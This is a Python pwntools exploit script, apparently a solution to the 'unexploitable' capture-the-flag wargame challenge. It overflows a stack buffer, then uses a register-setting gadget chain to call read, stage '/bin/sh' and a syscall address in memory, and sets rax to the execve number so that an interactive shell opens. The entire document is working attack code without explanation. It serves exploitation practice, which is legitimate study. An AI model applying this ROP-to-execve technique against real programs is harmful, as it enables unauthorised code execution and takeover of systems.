from pwn import *
import time

def call(addr, rdi=0, rsi=0, rdx=0):
    payload = ''
    payload += p64(0)       
    payload += p64(0)       # rbx
    payload += p64(1)       # rbp
    payload += p64(addr)    # r12
    payload += p64(rdi)     # r13
    payload += p64(rsi)     # r14
    payload += p64(rdx)     # r15
    payload += p64(0x4005d0)
    return payload

syscall = 0x400560
leaveret = 0x400576
read = 0x601000
buf = 0x601b08

p = process('./unexploitable')

time.sleep(3)

stage0 = ''
stage0 += 'A' * 0x18
stage0 += p64(0x4005e6)
stage0 += call(read, 0, buf, 0x3b)
stage0 += call(buf, buf+8, 0, 0)

p.send(stage0)

stage1 = ''
stage1 += p64(syscall)
stage1 += '/bin/sh\x00'
stage1 = stage1.ljust(0x3b, '\x00')

p.send(stage1)
p.interactive()
